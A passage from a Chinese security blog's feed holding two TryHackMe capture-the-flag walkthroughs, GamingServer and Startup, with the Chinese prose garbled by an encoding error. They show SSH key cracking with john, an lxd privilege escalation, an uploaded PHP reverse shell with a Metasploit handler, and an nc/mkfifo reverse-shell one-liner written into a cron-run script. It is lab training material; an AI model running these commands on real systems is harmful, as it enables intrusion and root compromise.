    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
    <category term="Linux" scheme="https://www.fomal.cc/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>THM-GamingServer</title>
    <link href="https://www.fomal.cc/posts/91bbca54.html"/>
    <id>https://www.fomal.cc/posts/91bbca54.html</id>
    <published>2024-10-06T05:28:31.000Z</published>
    <updated>2024-10-27T12:33:04.719Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>Èù∂Êú∫ipÔºö10.10.121.5</p><p>ÊîªÂáªÊú∫ipÔºö 10.11.101.220</p></blockquote><h1>‰ø°ÊÅØÊî∂ÈõÜ</h1><h2 id="nmapÊâ´Êèè">nmapÊâ´Êèè</h2><p><code>nmap --min-rate 10000 -sS -sV -sC 10.10.121.5</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142138386-1644378651.png" alt="image-20241006142136365"></p><p>Âè™ÂºÄÊîæ‰∫Ü22Âíå80Á´ØÂè£</p><h2 id="80Á´ØÂè£">80Á´ØÂè£</h2><p>![image-20241C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20241006142532131.png)</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142535295-1944826601.png" alt="image-20241006142533235"></p><p>ÈùûÂ∏∏ÁÇ´ÈÖ∑ÁöÑÁïåÈù¢</p><p>ÊµèËßà‰πãÂêéÂèëÁé∞Âú®<code>http://10.10.121.5/about.html#</code> ‰∏ãÔºåÊúâ‰∏™<code>upload</code>ÊåâÈíÆÔºåÁÇπÂáª‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142812327-1270244026.png" alt="image-20241006142810609"></p><p>ËøôÊó∂ÂÄôÂèëÁé∞Â∞±Ë∑≥ËΩ¨Âà∞‰∫ÜÂèØ‰ª•ÊµèËßàÁõÆÂΩïÁöÑÈ°µÈù¢</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142836482-132291457.png" alt="image-20241006142835118"></p><p>Âú®<code>dict.lst</code>‰∏≠ÊòØ‰∏Ä‰∏™Â≠óÂÖ∏</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142914037-561726342.png" alt="image-20241006142912365"></p><p>Â∞ÜÂÖ∂‰∏ãËΩΩÂà∞Êú¨Âú∞ÔºåÁïôÁùÄ‰ª•ÂêéÂèØËÉΩÁî®Âæó‰∏ä</p><p><code>manifesto.txt</code>ÂÜÖÂÆπÂ¶Ç‰∏ãÔºåÊòØ‰∏ÄÂ∞Å‰ø°</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006143159087-987491040.png" alt="image-20241006143157410"></p><p>ÂæóÂà∞‰∏Ä‰∏™Áî®Êà∑Âêç<code>Mentor</code></p><p>Áé∞Âú®Êàë‰ª¨Êúâ‰∫Ü‰∏Ä‰∏™Áî®Êà∑ÂêçÂíå‰∏Ä‰∏™ÂØÜÁ†ÅÂ≠óÂÖ∏Ôºå‰πãÂâçÁ´ØÂè£Êé¢ÊµãÁöÑÊó∂ÂÄôÔºåÂèëÁé∞22Á´ØÂè£ÊòØÂºÄÊîæÁöÑÔºåÊàë‰ª¨ÂèØ‰ª•Â∞ùËØïÈÄöËøáÁàÜÁ†¥<code>ssh</code>ÂØÜÁ†ÅÂ∞ùËØïÁôªÂΩï</p><h1>Ëé∑ÂèñÊôÆÈÄöÊùÉÈôê</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006144348962-739972565.png" alt="image-20241006144347297"></p><p>ÂæàÂèØÊÉúÔºåÊ≤°ÊúâÁ†¥Ëß£ÊàêÂäüÔºåÁªßÁª≠Â∞ùËØïÊâ´Êèè‰∏Ä‰∏ãÁõÆÂΩï</p><p><code>gobuster dir -u http://10.10.121.5/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006144925900-1562652202.png" alt="image-20241006144924456"></p><p>ÂèëÁé∞ÊúâÂá†‰∏™ÁâπÂà´ÁöÑ‰ø°ÊÅØÔºåÊü•Áúã‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006145023295-181828212.png" alt="image-20241006145021856"></p><p><code>robots.txt</code>ÈáåÁöÑ‰ø°ÊÅØÂπ∂‰∏çÂ§™ÈáçË¶ÅÔºåÂõ†‰∏∫Êàë‰ª¨‰πãÂâçÁÇπÂáª<code>upload</code>ËÆøÈóÆËøáËøô‰∏™ÁõÆÂΩï</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006145111847-955401844.png" alt="image-20241006145110462"></p><p>Ëøô‰∏™<code>/secret</code>ÁõÆÂΩïÊòØ‰∏™Êñ∞ÁõÆÂΩïÔºå‰πãÂâçÊ≤°ÊúâÊâæÂà∞ÔºåÊü•Áúã‰∏Ä‰∏ã<code>secretKey</code>Êñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006145149070-1566565554.png" alt="image-20241006145147571"></p><p>ÂèëÁé∞ËøôÊòØ<code>RSA</code>ÁßÅÈí•Êñá‰ª∂Ôºå‰∏ãËΩΩ‰∏ãÊù•‰øùÂ≠ò‰∏∫<code>id_rsa</code>Âπ∂Ëµã‰∫à<code>600</code>ÊùÉÈôêÔºåÁàÜÁ†¥Âä†ÂØÜÁßÅÈí•ÁöÑÂØÜÁ†Å</p><p>ÂÖàÂ∞Ü<code>id_rsa</code>ËΩ¨Êç¢‰∏∫hashÊ†ºÂºè</p><p><code>ssh2john id_rsa &gt; rsa_hash</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006150305820-1630075297.png" alt="image-20241006150304289"></p><p>‰ΩøÁî®<code>john</code>ÂºÄÂßãÁàÜÁ†¥</p><p><code>john rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p>‰ΩøÁî®<code>john rsa_hash --show</code>Êü•ÁúãÁªìÊûú</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006150549966-1727897226.png" alt="image-20241006150548683"></p><p>ÊâæÂà∞ÂØÜÁ†Å<code>letmein</code>Ôºå‰ΩøÁî®sshÁßÅÈí•ÁôªÂΩï</p><p><code>ssh Mentor@10.10.121.5 -i id_rsa</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006151533269-1114822329.png" alt="image-20241006151531886"></p><p>ÁôªÈôÜÂêéËøòÊòØÂ§±Ë¥•‰∫ÜÔºåËÇØÂÆöÊòØ‰πãÂâçÊúâÂì™‰∫õ‰ø°ÊÅØÊ≤°ÊúâÊ≥®ÊÑèÂà∞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006151645250-647968347.png" alt="image-20241006151643801"></p><p>Âú®È¶ñÈ°µÊ∫êÁ†ÅÂ§ÑÂèëÁé∞Âè¶‰∏Ä‰∏™Áî®Êà∑<code>john</code>Ôºå‰ΩøÁî®Ëøô‰∏™Áî®Êà∑Â∞ùËØïÁôªÂΩï</p><p><code>ssh john@10.10.121.5 -i id_rsa</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006151828540-1248866941.png" alt="image-20241006151827027"></p><p>ÁôªÈôÜÊàêÂäüÔºåÁúãÊù•‰πãÂâçÁöÑÈÇ£Â∞Å‰ø°Âè™ÊòØ‰∏ÄÂ∞Å‰ø°ËÄåÂ∑≤</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006153331301-1480645588.png" alt="image-20241006153329663"></p><p>Áõ¥Êé•Âú®ÂΩìÂâçÁõÆÂΩïÊâæÂà∞<code>user.txt</code></p><h1>ÊùÉÈôêÊèêÂçá</h1><p><code>sudo -l</code>Áî±‰∫éÁº∫Â∞ëÂØÜÁ†ÅÂà©Áî®‰∏ç‰∫ÜÔºåÊü•ÁúãÂÖ∂‰ªñÂÜÖÂÆπÊó∂‰πüÊ≤°ÊúâÂèØ‰ª•Âà©Áî®ÁöÑ‰ø°ÊÅØ</p><p>‰ΩøÁî®<code>id</code>Êü•Áúã‰∏Ä‰∏ãÂΩìÂâçÊùÉÈôê</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006153616066-342538492.png" alt="image-20241006153614508"></p><p>ÂèëÁé∞ÂèØ‰ª•Âà©Áî®<code>lxd</code>ÊèêÊùÉ</p><ul><li>ÊîªÂáªÊú∫ÂáÜÂ§á</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ÈÄöËøágitÂ∞ÜÊûÑÂª∫Â•ΩÁöÑalpineÈïúÂÉèÂÖãÈöÜËá≥Êú¨Âú∞ÔºõÊâßË°å‚Äúbuild -alpine‚ÄùÂëΩ‰ª§ÂÆåÊàêÊúÄÊñ∞ÁâàÊú¨ÁöÑAlpineÈïúÂÉèÊûÑÂª∫ÔºåÊ≠§Êìç‰ΩúÂøÖÈ°ªÁî±rootÁî®Êà∑ÂÆåÊàê</span><br><span class="line">Â∞ÜtarÊñá‰ª∂ÂèëÈÄÅËá≥ÁõÆÊ†áËÆæÂ§á</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span>  https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br><span class="line">ËøêË°åÂÆå‰∏äËø∞ÂëΩ‰ª§‰πãÂêéÔºå‰ºöÂú®ÂΩìÂâçÁõÆÂΩï‰∏ãÂàõÂª∫‰∏Ä‰∏™tar.gzÊñá‰ª∂Ôºå‰πãÂêéÊàë‰ª¨ÈúÄË¶ÅÂ∞ÜÂÖ∂ÂèëÈÄÅËá≥ÁõÆÊ†áÁ≥ªÁªü</span><br><span class="line"></span><br><span class="line">Âè¶‰∏ÄÊñπÈù¢ÔºåÊàë‰ª¨ËøòÈúÄË¶ÅÂ∞ÜalpineÈïúÂÉèÂèëÈÄÅËá≥ÁõÆÊ†áÁ≥ªÁªüÁöÑ/tmpÁõÆÂΩï‰∏≠</span><br><span class="line">python -m http.server 8081</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006160509601-1470459792.png" alt="image-20241006160508143"></p><ul><li>Èù∂Êú∫Êìç‰Ωú</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://10.11.101.220:8081/apline-v3.10-x86_64-20191008_1227.tar.gz</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006160621679-466446020.png" alt="image-20241006160620196"></p><p>ÈïúÂÉèÊûÑÂª∫ÂÆåÊàê‰πãÂêéÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•Â∞ÜÂÖ∂‰ª•ÈïúÂÉèÁöÑÂΩ¢ÂºèÊ∑ªÂä†ËøõLXD‰∫Ü</p><p><code>lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage</code></p><p>‰ΩøÁî®<code>lxc image list</code>ÂëΩ‰ª§Âç≥ÂèØÊ£ÄÊü•ÂèØÁî®ÁöÑÂÆπÂô®ÂàóË°®</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006160943758-117140868.png" alt="image-20241006160942338"></p><p>ÊâßË°å‰ª•‰∏ãÂëΩ‰ª§ËøõË°åÊèêÊùÉ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lxc init myimage ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">lxc start ignite</span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006161123649-1743013902.png" alt="image-20241006161122252"></p><p>ËøõÂÖ•ÂÆπÂô®‰πãÂêéÔºåÂÆö‰ΩçÂà∞<code>/mnt/root</code>Âç≥ÂèØÊü•ÁúãÁõÆÊ†á‰∏ªÊú∫ËÆæÂ§áÁöÑÊâÄÊúâËµÑÊ∫ê„ÄÇËøêË°å‰∫ÜBashËÑöÊú¨‰πãÂêéÔºåÊàë‰ª¨Â∞ÜÂæóÂà∞‰∏Ä‰∏™ÁâπÊÆäÁöÑShellÔºå‰πüÂ∞±ÊòØÂÆπÂô®ÁöÑShell„ÄÇËøô‰∏™ÂÆπÂô®‰∏≠ÂåÖÂê´‰∫ÜÁõÆÊ†á‰∏ªÊú∫ÁöÑÂÖ®ÈÉ®ËµÑÊ∫ê</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006161422968-662607515.png" alt="image-20241006161421526"></p><p>ÊúÄÂêéÂú®<code>/mnt/root/root</code>‰∏ãÊâæÂà∞<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMeÁ≥ªÂàó‰πãGamingServer</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
    <category term="Linux" scheme="https://www.fomal.cc/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>THM-Startup</title>
    <link href="https://www.fomal.cc/posts/d57c7ddd.html"/>
    <id>https://www.fomal.cc/posts/d57c7ddd.html</id>
    <published>2024-10-01T11:35:50.000Z</published>
    <updated>2024-10-27T12:32:48.005Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>Èù∂Êú∫ipÔºö10.10.45.30</p><p>ÊîªÂáªÊú∫ipÔºö 10.11.101.220</p></blockquote><h1>‰ø°ÊÅØÊî∂ÈõÜ</h1><h2 id="nmapÊâ´Êèè">nmapÊâ´Êèè</h2><p><code> nmap -sS -sV -sC 10.10.45.30</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 19:41 CST</span><br><span class="line">mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers: No such file or directory (2)</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 10.10.45.30</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]</span><br><span class="line">| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg</span><br><span class="line">|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 10.11.101.220</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)</span><br><span class="line">|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)</span><br><span class="line">|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-title: Maintenance</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.40 seconds</span><br></pre></td></tr></table></figure><p>ÂèëÁé∞Â≠òÂú®21Ôºå22Ôºå80Á´ØÂè£ÔºåÂÖ∂‰∏≠21Á´ØÂè£ÂèØ‰ª•ÂåøÂêçÁôªÂΩï</p><h2 id="21Á´ØÂè£">21Á´ØÂè£</h2><p>Áõ¥Êé•ÂåøÂêçÁôªÂΩï</p><p><code>ftp anonymous@10.10.45.30</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001194636259-1717138662.png" alt="image-20241001194628456"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001194933862-1716586471.png" alt="image-20241001194926284"></p><p>ÂèëÁé∞Â≠òÂú®‰∏Ä‰∫õÊñá‰ª∂ÂÖ®ÈÉ®<code>get</code>‰∏ãÊù•ÔºåÂÖ∂‰∏≠<code>ftp</code>ÁõÆÂΩïÊòØÁ©∫ÁöÑ</p><h2 id="ftpÊñá‰ª∂ÂàÜÊûê">ftpÊñá‰ª∂ÂàÜÊûê</h2><ul><li><code>important.jpg</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001195241174-1196545580.png" alt="image-20241001195233137"></p><p>Ê≤°Âï•Áî®</p><ul><li><code>notice.txt</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001195329943-334597323.png" alt="image-20241001195322711"></p><p>ÁúãÊ†∑Â≠êË≤å‰ººË∑ü‰∏ãËΩΩÊñá‰ª∂ÊúâÂÖ≥ÔºüÔºàÂπ∂‰∏çÁ°ÆÂÆöÔºâ</p><h2 id="80Á´ØÂè£">80Á´ØÂè£</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001195527538-1538863478.png" alt="image-20241001195519953"></p><p>È¶ñÈ°µ‰ªÄ‰πà‰πüÊ≤°ÊúâÔºåÁõ¥Êé•Êâ´ÁõÆÂΩï</p><p><code>gobuster dir -u http://10.10.45.30/ -w /usr/share/wordlists/dirb/common.txt -z</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001200104194-693790804.png" alt="image-20241001200056829"></p><p>ÂèëÁé∞Â≠òÂú®<code>/files</code>Ë∑ØÁî±ÔºåËÆøÈóÆ‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001200145197-2050816862.png" alt="image-20241001200137927"></p><p>ÂèëÁé∞ÊòØÊàë‰ª¨ÈÄöËøá<code>ftp</code>ÂåøÂêçÁôªÂΩïËé∑ÂæóÁöÑÂÜÖÂÆπ</p><h1>Ëé∑Âèñ‰∏ªÊú∫ÊùÉÈôê</h1><h2 id="MSFËé∑ÂèñÊôÆÈÄöÊùÉÈôê">MSFËé∑ÂèñÊôÆÈÄöÊùÉÈôê</h2><p>ÂèëÁé∞Âú®<code>ftp</code>‰∏≠ÁöÑÊñá‰ª∂ÂèØ‰ª•Âú®<code>http</code>‰∏≠ËÆøÈóÆÂà∞ÔºåÊâÄ‰ª•Êàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøá<code>ftp</code>‰∏ä‰º†Êú®È©¨ÔºåÈÄöËøá<code>http</code>ÊâßË°åÔºå‰ªéËÄåËé∑ÂæóÊúçÂä°Âô®ÁöÑÊùÉÈôê</p><p>Âú®‰πãÂâçÊàë‰ª¨‰ªé<code>ftp</code>‰∏ãËΩΩÊñá‰ª∂ÁöÑÊó∂ÂÄôÂèëÁé∞<code>ftp</code>ÁõÆÂΩïÊòØÂÖ∑ÊúâÂèØÂÜôÊùÉÈôêÁöÑÔºåÊâÄ‰ª•Êàë‰ª¨Â∞±ÈÄöËøáËøô‰∏™ÁõÆÂΩï‰∏ä‰º†Êñá‰ª∂</p><p>ÂÖàÁîüÊàê‰∏Ä‰∏™phpÂèçÂºπshellÁöÑÊú®È©¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201240718-6841116.png" alt="image-20241001201232855"></p><p>Â∞ÜËØ•Êú®È©¨‰º†Âà∞Êú∫Âô®ÁöÑftpÁõÆÂΩï‰∏ãÔºåÊ≠§Êó∂ÈÄöËøáhttpÂèØ‰ª•Êü•ÁúãÂà∞Ê≠§Êñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201325202-1889182470.png" alt="image-20241001201317928"></p><p>‰ΩøÁî®msfÂàõÂª∫‰∏Ä‰∏™ÁõëÂê¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler# ‰ΩøÁî® exploit/multi/handler Ê®°Âùó</span><br><span class="line">set  payload php/meterpreter/reverse_tcp# ËÆæÁΩÆphpÁöÑÊîªÂáªË¥üËΩΩpayload</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201533813-1700211541.png" alt="image-20241001201526055"></p><p>Â∞ÜÂèÇÊï∞ËÆæÁΩÆÂ•Ω</p><p><code>set LHOST  10.11.101.220</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201702538-1525155851.png" alt="image-20241001201655307"></p><p><code>run</code>ÂêØÂä®</p><p>Âú®http‰∏äÁÇπÂáª<code>shell.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201750120-518358356.png" alt="image-20241001201742671"></p><p>msfÂõûËøûÊàêÂäü</p><p>Âà©Áî®<code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code>ÊãøÂà∞‰∫§‰∫íÂºèshell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201904169-1947917994.png" alt="image-20241001201856845"></p><p><img src="C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20241001201949796.png" alt="image-20241001201949796"></p><p>Âú®<code>/home</code>ÁõÆÂΩï‰∏ãÂèëÁé∞<code>lennie</code>ÁõÆÂΩïÔºå‰ΩÜÊòØÊàë‰ª¨Ê≤°ÊúâÊùÉÈôêËÆøÈóÆ</p><h2 id="WiresharkÊµÅÈáèÂàÜÊûê">WiresharkÊµÅÈáèÂàÜÊûê</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001202229662-246877002.png" alt="image-20241001202222169"></p><p>Âú®Ê†πÁõÆÂΩïÂèëÁé∞‰∏Ä‰∫õÊñá‰ª∂ÔºåÊü•Áúã‰∏Ä‰∏ã</p><ul><li><code>recipe.txt</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001202335325-965983582.png" alt="image-20241001202328035"></p><p>ËøòÊòØÊ≤°Êúâ‰ªÄ‰πàÂèØ‰ª•Âà©Áî®ÁöÑ‰ø°ÊÅØÔºåÁªßÁª≠Êü•ÁúãÂà´ÁöÑÂÜÖÂÆπ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001202451791-1921428504.png" alt="image-20241001202444169"></p><p>Âú®‰∏Ä‰∏™Êàë‰ª¨ÂèØ‰ª•ËÆøÈóÆÁöÑ<code>incidents</code>Êñá‰ª∂Â§π‰∏≠ÂèëÁé∞‰∏Ä‰∏™ÊµÅÈáèÂåÖÔºåÈÄöËøáhttpÂ∞ÜÂÖ∂‰∏ãËΩΩÂà∞Êú¨Âú∞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001202957544-1745101645.png" alt="image-20241001202949932"></p><p>Â∞ÜÊµÅÈáèÂåÖËΩ¨ÁßªËá≥‰πãÂâçÁöÑftpÁõÆÂΩï‰∏ãÔºåÂ∞±ÂèØ‰ª•ÈÄöËøáhttpÂ∞ÜÊñá‰ª∂‰∏ãËΩΩÂà∞Êú¨Âú∞‰∫Ü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001203556445-214800003.png" alt="image-20241001203548668"></p><p>Êãø<code>Wireshark</code>ÂàÜÊûê</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001204532595-900259921.png" alt="image-20241001204524749"></p><p>Âú®ÊµÅÈáèÂåÖÈáåÂèëÁé∞Áñë‰ºº<code>lennie</code>Áî®Êà∑ÁöÑÂØÜÁ†Å<code>c4ntg3t3n0ughsp1c3</code>Ôºå<code>ssh</code>Â∞ùËØïÁôªÈôÜ‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001205517574-1258939451.png" alt="image-20241001205510001"></p><p>ÁôªÈôÜÊàêÂäü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001205657732-1629873569.png" alt="image-20241001205650490"></p><p>Âú®<code>/home/lennie</code>ÁõÆÂΩï‰∏ãÊâæÂà∞<code>user.txt</code></p><h1>ÊùÉÈôêÊèêÂçá</h1><p>ÁªßÁª≠ÂØªÊâæÂÖ∂‰ªñ‰ø°ÊÅØÔºåÂú®<code>/home/lennie/Documents</code>‰∏ãÂèëÁé∞‰∏Ä‰∫õ<code>txt</code>Êñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210158295-521315857.png" alt="image-20241001210151013"></p><p>Âú®<code>/home/lennie/scripts</code>‰∏ãÊâæÂà∞<code>sh</code>Êñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210347977-2088833048.png" alt="image-20241001210340532"></p><p>Êü•Áúã‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210321820-713500301.png" alt="image-20241001210314585"></p><p>ÁªßÁª≠Êü•Áúã‰∏Ä‰∏ã<code>/etc/print.sh</code>Êñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210437858-314517372.png" alt="image-20241001210430409"></p><p>Êàë‰ª¨ÂèàÂèØ‰ª•ÂÜôÂÖ•ÂèçÂºπÁöÑshellÂà∞<code>/etc/print.sh</code>Êñá‰ª∂‰∏≠ÔºåÁÑ∂ÂêéÈÄöËøá<code>planner.sh</code>Ë∞ÉÁî®Êù•Ëé∑ÂæórootÊùÉÈôê</p><p><code>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.101.220 4445 &gt;/tmp/f&quot; &gt;/etc/print.sh</code></p><p>ÊâßË°åÂ∞Ü‰∏äËø∞ÂëΩ‰ª§</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210720380-89700049.png" alt="image-20241001210713124"></p><p>Ëµ∑‰∏Ä‰∏™Êñ∞ÁöÑÁõëÂê¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210754289-499424149.png" alt="image-20241001210747046"></p><p>Âá†‰πéÊòØÁû¨Èó¥Â∞±Êé•ÂèóÂà∞‰∫ÜÂèçÂºπÁöÑshell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210940417-178874238.png" alt="image-20241001210932745"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001211024288-765111761.png" alt="image-20241001211016797"></p><p>Áõ¥Êé•Âú®ÂΩìÂâçÁõÆÂΩïÂ∞±ÊâæÂà∞‰∫Ü<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMeÁ≥ªÂàó‰πãStartup</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
    <category term="Linux" scheme="https://www.fomal.cc/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>THM-LazyAdmin</title>
    <link href="https://www.fomal.cc/posts/986850d6.html"/>
